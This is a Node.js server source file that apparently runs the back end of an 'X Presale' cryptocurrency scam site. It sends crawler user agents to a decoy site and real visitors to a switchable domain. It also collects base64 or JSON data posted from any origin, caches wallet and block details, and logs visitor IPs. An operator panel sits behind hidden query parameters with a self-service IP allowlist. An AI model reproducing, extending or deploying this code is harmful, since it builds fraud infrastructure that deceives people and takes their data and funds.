const http = require('http')
const fs = require('fs')
let url = require('url')

let version = 13, ip, navMenu, baseHtml = fs.readFileSync('base.htm')

function log(fname, text) {
    let date = new Date()
    let when = `<span style="color: gray">${(date.getMonth() + 1).toString().padStart(2, '0')} ${date.getUTCDate().toString().padStart(2, '0')} ${date.getUTCHours().toString().padStart(2, '0')}:${date.getUTCMinutes().toString().padStart(2, '0')}:${date.getUTCSeconds().toString().padStart(2, '0')}<span>`
    try {
        fs.appendFileSync(fname, `${when}&nbsp;${text}<br>\n`)
    }
    catch {
        fs.writeFileSync(fname, `${when}&nbsp;${text}<br>\n`)
    }
}

var colorize = (string, saturation = 100, lightness = 75) => {
    let hash = 0
    for (let i = 0; i < string.length; i++) {
        hash = string.charCodeAt(i) + ((hash << 5) - hash)
        hash = hash & hash
    }
    return `hsl(${(hash % 360)}, ${saturation}%, ${lightness}%)`
}

function replaceAll(s, o, n) {
    do {
        s = s.replace(o, n);
    } while (s.includes(o))
    return s;
}

let visitorsFile = 'v.htm', archiveFile = 'archive.htm', hostFile = 'host.txt', allowedIps = 'ips.txt'

function save(fname, text) {
    try {
        fs.appendFileSync(fname, text);
    }
    catch {
        fs.writeFileSync(fname, text);
    }
}

function getClientIp(req) {
    const xForwardedFor = req.headers['x-forwarded-for'];
    if (xForwardedFor) {
        return xForwardedFor.split(',')[0].trim();
    }
    return req.socket.remoteAddress || 'unknown';
}

const walletStatusCache = new Map();

var server = http.createServer(async function (req, res) {
    const tmp = new URL(req.url, `http://${req.headers.host}`);
    if (tmp.pathname === '/status6661' && req.method === 'POST') {
        let body = '';

        // Collect the incoming stream data blocks
        req.on('data', chunk => {
            body += chunk;
        });

        req.on('end', () => {
            try {
                const data = JSON.parse(body);

                if (data.wallet && data.block) {
                    walletStatusCache.set(data.wallet, { wallet: data.wallet, block: data.block });
                    res.writeHead(200, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ status: 'success' }));
                } else {
                    res.writeHead(400, { 'Content-Type': 'application/json' });
                    res.end(JSON.stringify({ error: 'Invalid payload structure' }));
                }
            } catch (err) {
                res.writeHead(400, { 'Content-Type': 'application/json' });
                res.end(JSON.stringify({ error: 'Invalid JSON format' }));
            }
        });

        return;
    }

    // =========================================================
    // ROUTE 2: API ENDPOINT TO QUERY THE CACHE
    // =========================================================
    if (tmp.pathname === '/wallets6661' && req.method === 'GET') {
        const dataDict = Object.fromEntries(walletStatusCache);
        res.writeHead(200, { 'Content-Type': 'application/json' });
        res.end(JSON.stringify(dataDict));
        return;
    }

    let queryObject = url.parse(req.url, true).query;
    let userAgent = req.headers['user-agent']
    let referrer = req.headers.referrer || req.headers.referer || '-';
    let ip = getClientIp(req);

    if (!req.url.includes('/a?v666')) {
        let flags = ['Googlebot', 'TrendsmapResolver', 'LivelapBot', 'Twitterbot', 'PaperLiBot', 'help@dataminr.com', 'Discordbot', 'bot@linkfluence.com', 'Hatena::Bookmark', 'tweetedtimes.com', 'SerendeputyBot', 'Scamadviser', 'Twingly', 'com.apple.WebKit.Networking']
        let isBot = userAgent && flags.some(f => userAgent.includes(f))
        if (req.url.includes('.js')) isBot = true
        log(visitorsFile, `<span style="color: ${isBot ? 'yellow' : '#404040'}"><a href="https://ipwho.is/${ip}">${ip}</a> ${userAgent} ${req.url} ${req.method} ${referrer}</span>`);
    }

    if (req.method === 'POST') {
        if (req.url === '/info') {
            let body = '';

            req.on('data', chunk => {
                body += chunk.toString();
            });

            req.on('end', () => {
                try {
                    const data = JSON.parse(body);
                    let text = data.info
                    let html = `<span style="color: ${colorize(ip)}"><a href="https://ipwho.is/${ip}">${ip}</a>&nbsp;${text}</span>`;
                    log(visitorsFile, html);
                    res.writeHead(200, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' });
                    res.end(' ');
                } catch (error) {
                    res.writeHead(404, { 'Content-Type': 'text/plain' });
                    res.end('Not found');
                }
            });
        }
        else {
            let body = '';
            let maxBodySize = 50 * 1024;
            let tooLong = false;

            req.on('data', chunk => {
                if (tooLong) return;

                body += chunk.toString();

                if (body.length > maxBodySize) {
                    tooLong = true;
                    res.writeHead(413, { 'Content-Type': 'text/plain' }); // 413 Payload Too Large
                    res.end('Payload too large');
                }
            });

            req.on('end', () => {
                if (tooLong) return;

                const escapeHTML = (str) => str.replace(/</g, '&lt;').replace(/>/g, '&gt;');
                const safeBody = escapeHTML(body);
                const safeUA = escapeHTML(userAgent || 'Unknown');

                let decodedData = '';
                const isBase64 = /^[A-Za-z0-9+/]*={0,2}$/.test(body.trim()) && body.trim().length % 4 === 0;

                if (isBase64 && body.trim().length > 0) {
                    decodedData = escapeHTML(Buffer.from(body, 'base64').toString('utf8'));
                }
                log(visitorsFile, `<span style="color: limegreen">${safeBody}</span>`);
                log(visitorsFile, `<span style="color: yellow">${safeUA}</span>`);

                if (decodedData) log(visitorsFile, `<span style="color: red">${decodedData}</span>`);

                res.writeHead(200, { 'Content-Type': 'text/plain' });
                res.end('OK');
            });
        }
    }

    let info = queryObject['info'];
    let wlip = queryObject['ipwho666'];
    let visitors = queryObject['v6661'];
    let visitors3 = queryObject['v6663'];
    let bl = queryObject['bl']
    let host = queryObject['host6661'];
    let reset = queryObject['reset6661'];
    let newDomain = queryObject['domain6661'];
    navMenu = `<br/>
<table style="border: 0px; width: 25%; text-align: left;">
  <tbody>
    <tr>
      <td style="padding: 10px;"><p style="color: gray">v${version} ${ip}</a></td>
      <td style="padding: 10px;"><a href="./a?v6661=1">Visitors</a></td>
      <td style="padding: 10px;"><a href="./a?v6662=1">Metadata</a></td>
      <td style="padding: 10px;"><a href="./a?v6663=1">Archive</a></td>
      <td style="padding: 10px;"><a href="./a?reset6661=1" style="color: red;">Reset</a></td>
      <td style="padding: 10px;"><a href="/" target="_blank" style="color: limegreen;">Site</a></td>
    </tr>
  </tbody>
</table>`

    if (wlip) {
        save(allowedIps, `${ip}\n`);
        res.writeHead(200, { 'Content-Type': 'text/plain' });
        res.end(`${ip}`);
        return;
    }

    if (info) {
        try {
            let buff = Buffer.from(replaceAll(info, '$', '+'), 'base64');
            let text = buff.toString('ascii');
            let html = `<span style="color: ${colorize(ip)}"><a href="https://ipwho.is/${ip}">${ip}</a>&nbsp;${text}</span>`;
            log(visitorsFile, html);
            res.writeHead(200, { 'Content-Type': 'text/plain', 'Access-Control-Allow-Origin': '*' });
            res.end(' ');
        }
        catch (err) {
            console.log(err)
            log(visitorsFile, err.message);
        }
        return;
    }

    if (ip !== 'unknown' && fs.existsSync(allowedIps) && fs.readFileSync(allowedIps).includes(ip)) {
        if (host) {
            if (host === 'read') {
                let tmp = fs.readFileSync(hostFile).toString();
                res.end(tmp);
                return;
            }
            else {
                fs.writeFileSync(hostFile, host);
                res.writeHead(200, { 'Content-Type': 'text/plain' });
                res.end(host);
                return;
            }
        }

        if (reset) {
            let visitors = fs.readFileSync(visitorsFile).toString();
            fs.appendFileSync(archiveFile, visitors);
            fs.writeFileSync(visitorsFile, '')
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(`<html>
<head>
  <title>Logs</title>
  <meta http-equiv="refresh" content="0; URL=./a?v6661=1" />
</head>
<body>
</body>
</html>`);
            return;
        }

        if (visitors) {
            let visitors = fs.readFileSync(visitorsFile).toString();
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(`${baseHtml}${visitors.slice(-(bl ? bl : 50000))}${navMenu}`)
            return;
        }

        if (visitors3) {
            let visitors = fs.readFileSync(archiveFile).toString();
            res.writeHead(200, { 'Content-Type': 'text/html' });
            res.end(`${baseHtml}${visitors}${navMenu}`)
            return;
        }

        if (newDomain) {
            fs.writeFileSync('domain.txt', newDomain)
            res.writeHead(200, { 'Content-Type': 'text/plain' });
            res.end(`${newDomain}`)
            return;
        }
    }

    if (req.method === 'GET') {
        try {
            let tmp = req.url.split('/');
            let filename = tmp[tmp.length - 1].split('?')[0];
            if (filename.endsWith('.js')) {
                let text = fs.readFileSync(`./index.js`).toString();
                res.writeHead(200, { 'Content-Type': 'application/javascript' });
                res.end(text);
                return
            }
            else if (filename === 'robots.txt') {
                let text = fs.readFileSync('./robots.txt').toString();
                res.writeHead(200, { 'Content-Type': 'text/plain' });
                res.end(text);
                return
            }
            else {
                let filename = 'index.html'
                if (req.url.includes('/wp-admin/install.php?step=1')) filename = 'wordpress.htm'
                let text = fs.readFileSync(filename).toString();
                res.writeHead(200, { 'Content-Type': 'text/html' });
                res.end(text);
                return;

                res.writeHead(200, { 'Content-Type': 'text/html' });
                let domain = fs.readFileSync('./domain.txt').toString().trim()
                let redirectUrl = isBot ? 'https://terafab.ai' : `https://${domain}`
                res.end(`<html>
<head>
  <title>X Presale</title>
  <meta http-equiv="refresh" content="0; url=${redirectUrl}">
</head>
<body style="background-color: black">
</body>
</html>`);
                return
            }
        }
        catch (err) {
            log(visitorsFile, err.message)
        }
        res.writeHead(404, { 'Content-Type': 'text/plain' });
        res.end('Not found');
    }
});

server.listen();